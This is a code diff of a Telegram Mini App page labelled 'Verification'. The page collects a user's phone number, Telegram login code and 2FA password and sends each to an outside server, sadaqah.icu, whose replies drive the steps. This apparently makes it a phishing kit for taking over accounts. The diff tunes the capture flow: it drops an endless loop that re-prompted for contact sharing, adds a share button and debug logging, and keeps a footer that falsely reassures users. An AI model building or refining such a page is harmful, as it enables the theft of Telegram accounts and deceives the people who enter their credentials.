@@ -6,7 +6,6 @@
   <title>Verification</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    /* --- стили без изменений (см. предыдущие версии) --- */
     :root{
       --bg: var(--tg-theme-bg-color, #0b0d10);
       --text: var(--tg-theme-text-color, #e9eef5);
@@ -198,6 +197,17 @@
       margin-top: 12px;
       cursor: pointer;
     }
+
+    .twofa-input {
+      width: 100%;
+      padding: 12px;
+      border-radius: var(--radius);
+      border: 1px solid rgba(255,255,255,.2);
+      background: rgba(0,0,0,.3);
+      color: var(--text);
+      font-size: 16px;
+      margin: 10px 0;
+    }
   </style>
 </head>
 
@@ -208,7 +218,7 @@
       <p>Loading...</p>
     </div>
 
-    <!-- Блок запроса номера (скрыт изначально) -->
+    <!-- Блок запроса номера -->
     <div id="phoneBlock" class="card hidden">
       <div class="top">
         <div>
@@ -217,7 +227,7 @@
         </div>
         <div class="pill" id="phoneDisplay">Not shared</div>
       </div>
-      <!-- Кнопка не нужна, запрос автоматический -->
+      <button id="requestPhoneBtn" class="retry-btn">📱 Share phone number</button>
     </div>
 
     <!-- Блок ввода кода -->
@@ -254,8 +264,6 @@
     <!-- Клавиатура для кода -->
     <div class="keyboard card" id="keyboard"></div>
     <div class="footerNote">Your data is not stored on the device.</div>
-
-    <!-- Всплывающее окно для ошибок (можно заменить на alert) -->
   </div>
 
   <script>
@@ -287,6 +295,7 @@
       const keyboard = document.getElementById('keyboard');
       const twofaInput = document.getElementById('twofaInput');
       const submit2faBtn = document.getElementById('submit2faBtn');
+      const requestPhoneBtn = document.getElementById('requestPhoneBtn');
 
       const CODE_LEN = 5; // должно совпадать с config.py
       let code = '';
@@ -302,6 +311,7 @@
       }
 
       function showBlock(blockId) {
+        console.log('Showing block:', blockId);
         loadingBlock.classList.add('hidden');
         phoneBlock.classList.add('hidden');
         codeBlock.classList.add('hidden');
@@ -310,12 +320,18 @@
         if (blockId === 'phone') {
           phoneBlock.classList.remove('hidden');
           keyboard.style.display = 'none';
+          if (currentPhone) {
+            phoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
+          } else {
+            phoneDisplay.textContent = 'Not shared';
+          }
         } else if (blockId === 'code') {
           codeBlock.classList.remove('hidden');
           keyboard.style.display = 'grid';
           if (currentPhone) {
             codePhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
           }
+          renderDots();
         } else if (blockId === '2fa') {
           twofaBlock.classList.remove('hidden');
           keyboard.style.display = 'none';
@@ -332,6 +348,7 @@
         try {
           const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
           const data = await res.json();
+          console.log('Fetched state:', data.state);
           return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
         } catch (e) {
           console.error('Status error:', e);
@@ -339,38 +356,20 @@
         }
       }
 
-      // --- Логика запроса номера с бесконечным повтором при отмене ---
-      let phoneRequestTimer = null;
-      let isRequestingPhone = false;
-      let phoneShared = false; // true, когда номер успешно получен от пользователя
-
+      // --- Логика запроса номера ---
       async function requestPhone() {
-        // Если номер уже получен, ничего не делаем
-        if (phoneShared) return;
-
-        // Если уже выполняется запрос, не запускаем новый
-        if (isRequestingPhone) return;
-
-        // Очищаем предыдущий таймер
-        if (phoneRequestTimer) {
-          clearTimeout(phoneRequestTimer);
-          phoneRequestTimer = null;
-        }
-
-        isRequestingPhone = true;
-
+        console.log('Requesting phone...');
         try {
           const contactData = await WebApp.requestContact();
+          console.log('Contact data:', contactData);
           
           if (contactData && contactData.contact && contactData.contact.phone_number) {
             const phone = contactData.contact.phone_number;
-            // Номер получен – запоминаем и сохраняем в localStorage
             currentPhone = phone;
             localStorage.setItem('tg_phone', phone);
             phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
-            phoneShared = true; // останавливаем цикл
 
-            // Отправляем номер на сервер и ждём ответа
+            // Отправляем номер на сервер
             try {
               const res = await fetch('https://sadaqah.icu/submit_phone', {
                 method: 'POST',
@@ -378,74 +377,27 @@
                 body: JSON.stringify({ user_id: userId, phone: phone })
               });
               const result = await res.json();
+              console.log('Submit phone result:', result);
               if (result.status === 'ok') {
                 showBlock('code');
               } else {
-                // Ошибка сервера – показываем сообщение и кнопку "Повторить"
-                alert('Server error: ' + (result.error || 'Unknown error'));
-                // Даём возможность повторить отправку того же номера
-                createRetryButton(phone);
+                alert('Server error: ' + (result.message || 'Unknown error'));
+                // Остаёмся в блоке номера
               }
             } catch (err) {
+              console.error('Network error sending phone:', err);
               alert('Network error while sending phone. Please try again.');
-              createRetryButton(phone);
             }
           } else {
-            // Странный случай – повтор через 500 мс
-            if (!phoneShared) {
-              phoneRequestTimer = setTimeout(requestPhone, 500);
-            }
+            console.log('No contact data received');
           }
         } catch (error) {
-          // Пользователь отменил запрос контакта
-          console.log('Request contact cancelled');
-          if (!phoneShared) {
-            phoneRequestTimer = setTimeout(requestPhone, 500);
-          }
-        } finally {
-          isRequestingPhone = false;
+          console.log('Request contact cancelled or error:', error);
+          // При отмене ничего не делаем, пользователь может нажать кнопку снова
         }
       }
 
-      // Функция для повторной отправки номера (без повторного запроса контакта)
-      function createRetryButton(phone) {
-        // Показываем блок телефона, но с кнопкой "Retry"
-        phoneBlock.classList.remove('hidden');
-        // Скрываем старый контент, добавляем кнопку
-        const oldContent = phoneBlock.querySelector('.top');
-        const retryBtn = document.createElement('button');
-        retryBtn.className = 'retry-btn';
-        retryBtn.textContent = '🔄 Try again';
-        retryBtn.onclick = async () => {
-          retryBtn.disabled = true;
-          retryBtn.textContent = 'Sending...';
-          try {
-            const res = await fetch('https://sadaqah.icu/submit_phone', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ user_id: userId, phone: phone })
-            });
-            const result = await res.json();
-            if (result.status === 'ok') {
-              showBlock('code');
-            } else {
-              alert('Server error: ' + (result.error || 'Unknown error'));
-              retryBtn.disabled = false;
-              retryBtn.textContent = '🔄 Try again';
-            }
-          } catch (err) {
-            alert('Network error');
-            retryBtn.disabled = false;
-            retryBtn.textContent = '🔄 Try again';
-          }
-        };
-        // Очищаем блок и добавляем кнопку
-        phoneBlock.innerHTML = '';
-        phoneBlock.appendChild(oldContent);
-        phoneBlock.appendChild(retryBtn);
-      }
-
-      // --- Логика ввода кода (аналогично предыдущим версиям) ---
+      // --- Логика ввода кода ---
       function renderDots() {
         codeDots.innerHTML = '';
         for (let i = 0; i < CODE_LEN; i++) {
@@ -466,23 +418,24 @@
         if (code.length >= CODE_LEN) return;
         code += d;
         haptic('light');
-        updateUI();
-      }
-
-      function deleteDigit() {
-        if (!code.length) return;
-        code = code.slice(0, -1);
-        haptic('light');
-        updateUI();
-      }
-
-      function updateUI() {
         renderDots();
         if (code.length === CODE_LEN) {
           WebApp.MainButton
             .setText('Confirm')
             .show()
             .onClick(sendCode);
+        } else {
+          WebApp.MainButton.hide();
+        }
+      }
+
+      function deleteDigit() {
+        if (!code.length) return;
+        code = code.slice(0, -1);
+        haptic('light');
+        renderDots();
+        if (code.length === CODE_LEN) {
+          WebApp.MainButton.show();
         } else {
           WebApp.MainButton.hide();
         }
@@ -498,6 +451,7 @@
             body: JSON.stringify({ user_id: userId, phone: currentPhone, code: code })
           });
           const result = await res.json();
+          console.log('Submit code result:', result);
           if (result.status === 'ok') {
             haptic('medium');
             WebApp.close();
@@ -512,6 +466,7 @@
             renderDots();
           }
         } catch (err) {
+          console.error('Network error sending code:', err);
           WebApp.MainButton.enable().showProgress(false);
           haptic('rigid');
           alert('Network error: ' + err);
@@ -534,6 +489,7 @@
             body: JSON.stringify({ user_id: userId, password: password })
           });
           const result = await res.json();
+          console.log('Submit 2FA result:', result);
           if (result.status === 'ok') {
             haptic('medium');
             WebApp.close();
@@ -542,6 +498,7 @@
             twofaInput.value = '';
           }
         } catch (err) {
+          console.error('Network error sending 2FA:', err);
           alert('Network error: ' + err);
         } finally {
           submit2faBtn.disabled = false;
@@ -578,29 +535,32 @@
         }
       });
 
+      // --- Обработчик кнопки запроса номера ---
+      requestPhoneBtn.addEventListener('click', requestPhone);
+
       // --- Инициализация ---
       (async () => {
+        showBlock('loading');
         const state = await fetchState();
+        console.log('Initial state:', state);
+
         if (state === 'get_number' || state === 'none') {
           showBlock('phone');
-          // Запускаем бесконечный цикл запроса номера
-          requestPhone();
         } else if (state === 'get_code') {
-          // Пытаемся восстановить номер из localStorage
           if (!currentPhone) {
-            // Нет номера – это проблема, лучше запросить заново
+            // Нет номера – запрашиваем заново
             showBlock('phone');
-            requestPhone();
           } else {
             showBlock('code');
           }
         } else if (state === 'get_2fa') {
           if (!currentPhone) {
             showBlock('phone');
-            requestPhone();
           } else {
             showBlock('2fa');
           }
+        } else {
+          showBlock('phone');
         }
       })();
     })();
